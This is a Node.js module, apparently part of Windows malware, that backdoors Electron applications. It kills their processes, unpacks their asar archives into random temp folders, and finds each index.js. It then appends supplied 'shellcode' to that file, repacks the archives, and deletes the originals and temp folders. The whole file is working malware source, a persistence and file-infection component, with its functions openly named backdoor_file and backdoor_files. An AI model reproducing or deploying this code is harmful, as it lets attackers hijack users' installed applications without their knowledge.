const { exec } = require('child_process');
var asar = require('./asar/bin/asar');
var { appendFile, unlink, rm, existsSync } = require('fs');
var list_asar = require('asar').listPackage;

function kill_process(process){
    try{
        exec(`taskkill /f /im "${process}"`, {'shell': true, 'windowsHide': true},(err, stdout, stderr) => {
            if(err){
                // console.log(`error! ${err}`);
            }
            if(stderr){
                // console.log(`stderr! ${stderr}`);
            }
            if(stdout){
                // console.log(`stdout! ${stdout}`);
            }
        })
    }
    catch(e) {}
}

function kill_interferring_processes(process_list){
    try{
        for (process of process_list){
            console.log(`killing: ${process}`);
            kill_process(process);
        }
    }
    catch(e){}
}

function pack_archive(archive, dest){
    try{
        asar.pack(archive, dest);
    }
    catch(e){
        console.log("pack failed... looping");
        pack_archive(archive, dest);
    }
}

async function pack_archives(extracted_archive_array, asar_apps_array){
    try{
        for(let i=0; i< extracted_archive_array.length; i++){
            pack_archive(extracted_archive_array[i], asar_apps_array[i]);
        }
    }
    catch(e){
        for(let i=0; i< extracted_archive_array.length; i++){
            pack_archive(extracted_archive_array[i], asar_apps_array[i]);
        }
    }
}

function list_archive(archive){
    indexed = [];
    try{
        archive_files = list_asar(archive);
        for (file of archive_files){
            if(file.endsWith('index.js')){
                indexed.push(file);
            }
        }
        return indexed[0];
    }
    catch(e){}
}

function list_archives(archive_array){
    paths = [];
    for(archive of archive_array){
        var path = list_archive(archive).split('\\');
        paths.push(path.join('\\'));
    }
    return paths;
}

function extract_archive(archive, dest){
    try{
        asar.extract(archive, dest);
    }
    catch(e){
        extract_archive(archive, dest);
    }
}

function extract_archives(appdata_apps){
    archive_array = [];
    try {
        for(app in appdata_apps){
            let random_str = Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 10);
            let path = process.env.TMP + `\\${random_str}`;
            extract_archive(appdata_apps[app], path);
            archive_array.push(path);
        }
        return archive_array;
    }
    catch(e){}
}

function backdoor_file(file, shellcode){
    try{
        appendFile(file, '\n' + shellcode, function (err) {
            if (err) { backdoor_file(file, shellcode); }
        });
    }
    catch(e){}
}

async function backdoor_files(file_array, shellcode){
    for(file of file_array){
        backdoor_file(file, shellcode);
    }
}

function delete_archives(archive_array){
    try{
        for(archive of archive_array){
            unlink(archive, (err => {
                if (err) {
                    delete_archives(archive_array);
                }
            }));
        }
    }
    catch(e){}
}
function clear_folder(folder){
    rm(folder, {'recursive': 'true'}, (err)=> {
        if(err){
            console.log(err);
        }
    });
}
function clear_folders(folder_array){
    for(folder of folder_array){
        clear_folder(folder);
    }
}
function check_file_exists(fd){
    try{
        if(existsSync(fd)){
            return true;
        }
        else{
            return false;
        }
    }
    catch(e){ }
}

module.exports = {
    check_file_exists,
    delete_archives,
    extract_archive,
    extract_archives,
    pack_archive,
    pack_archives,
    list_archive,
    list_archives,
    backdoor_file,
    backdoor_files,
    kill_process,
    clear_folder,
    clear_folders,
    kill_interferring_processes
}